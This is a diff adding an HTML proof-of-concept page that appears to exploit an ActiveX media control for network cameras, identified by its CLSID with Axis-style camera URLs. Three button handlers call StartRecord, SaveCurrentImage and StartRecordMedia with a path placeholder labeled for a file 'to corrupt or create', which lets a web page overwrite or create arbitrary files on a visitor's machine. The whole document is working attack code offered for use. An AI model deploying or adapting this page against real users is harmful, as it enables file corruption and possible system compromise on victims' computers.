@@ -1,0 +1,40 @@
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;&lt;/title&gt;
+        &lt;script language=&quot;javaScript&quot; type=&quot;text/javascript&quot;&gt;
+            function startRecord(){
+         var theFile = &quot;FilePath//File_name_to_corrupt_or_create&quot;;
+              MyActiveX.StartRecord(theFile);
+            }
+            function saveCurrentImage(){
+         var theFile = &quot;FilePath//File_name_to_corrupt_or_create&quot;;
+              var theFormat = 1;
+              MyActiveX.SaveCurrentImage(theFormat, theFile);
+            }
+            function startRecordMedia(){
+         var theFile = &quot;FilePath//File_name_to_corrupt_or_create&quot;;
+              var theFlags = 1;
+              var theMediaTypes  = &quot;default&quot;
+              MyActiveX.StartRecordMedia(theFile, theFlags, theMediaTypes);
+            }
+        &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+    &lt;object id=MyActiveX classid=&quot;CLSID:{DE625294-70E6-45ED-B895-CFFA13AEB044}&quot; style=&quot;width:640;height:480&quot;&gt;
+    &lt;param name=&quot;MediaURL&quot; value=&quot;http://xx.xx.xx.xx/mjpg/video.mjpg&quot;&gt;
+    &lt;param name=&quot;MediaType&quot; value=&quot;mjpeg&quot;&gt;
+    &lt;param name=&quot;Volume&quot; value=&quot;1&quot;&gt;
+    &lt;param name=&quot;ShowStatusBar&quot; value=&quot;1&quot;&gt;
+    &lt;param name=&quot;ShowToolbar&quot; value=&quot;1&quot;&gt;
+    &lt;param name=&quot;AutoStart&quot; value=&quot;1&quot;&gt;
+    &lt;param name=&quot;UIMode&quot; value=&quot;ptz-relative&quot;&gt;
+    &lt;param name=&quot;MediaType&quot; value=&quot;mjpeg-unicast&quot;&gt;
+    &lt;param name=&quot;StretchToFit&quot; value=&quot;0&quot;&gt;
+    &lt; param name =&#039;PTZControlURL&#039; value=http://xx.xx.xx.xx/axis-cgi/com/ptz.cgi&gt; 
+    &lt;/object&gt;
+    &lt;br&gt;
+    &lt;INPUT TYPE=&quot;button&quot; VALUE=&quot;StartRecord&quot; ONCLICK=&quot;startRecord()&quot;&gt;
+    &lt;INPUT TYPE=&quot;button&quot; VALUE=&quot;SaveCurrentImage&quot; ONCLICK=&quot;saveCurrentImage()&quot;&gt;
+    &lt;INPUT TYPE=&quot;button&quot; VALUE=&quot;StartRecordMedia&quot; ONCLICK=&quot;startRecordMedia()&quot;&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
